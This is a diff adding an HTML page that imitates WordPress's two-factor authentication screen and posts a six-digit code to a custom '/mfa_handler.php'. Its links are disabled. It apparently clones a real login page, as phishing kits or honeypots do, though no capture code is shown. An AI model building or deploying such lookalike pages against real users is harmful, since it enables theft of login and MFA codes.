@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Two-Factor Authentication &lsaquo; Wordpress &#8212; WordPress</title>
+    <meta name='robots' content='max-image-preview:large, noindex, noarchive' />
+    <link rel='stylesheet' href='wp-login.css' media='all' />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+</head>
+<body class="login no-js login-action-login wp-core-ui locale-en-us">
+    <script>
+        document.body.className = document.body.className.replace('no-js','js');
+    </script>
+
+    <h1 class="screen-reader-text">Two-Factor Authentication</h1>
+    <div id="login">
+        <h1 role="presentation" class="wp-login-logo">
+            <a href="#" onclick="return false;">Powered by WordPress</a>
+        </h1>
+
+        <form name="otpform" id="otpform" action="/mfa_handler.php" method="post">
+            <p class="message">
+                A verification code has been sent to your email address. Please enter the code below.
+            </p>
+            
+            <p>
+                <label for="otp_code">Verification Code</label>
+                <input type="text" name="otp" id="otp_code" class="input" value="" size="20" maxlength="6" required="required" placeholder="Enter 6-digit code" />
+            </p>
+            
+            <p class="submit">
+                <input type="submit" name="verify-submit" id="verify-submit" class="button button-primary button-large" value="Verify" />
+            </p>
+        </form>
+
+        <script>
+            // Auto-focus on OTP input
+            document.getElementById('otp_code').focus();
+            
+            // Show error message if present
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('error') === '1') {
+                const errorMsg = document.createElement('div');
+                errorMsg.className = 'message';
+                errorMsg.style.color = '#d63638';
+                errorMsg.innerHTML = '<p>❌ Invalid verification code. Please try again.</p>';
+                document.querySelector('.message').after(errorMsg);
+            }
+        </script>
+        
+        <p id="nav">
+            <a class="wp-login-lost-password" href="#" onclick="return false;">Lost your password?</a>
+        </p>
+        
+        <p id="backtoblog">
+            <a href="#" onclick="return false;">&larr; Go Back </a>
+        </p>
+    </div>
+
+    <script src='wp-scripts.js'></script>
+</body>
+</html>
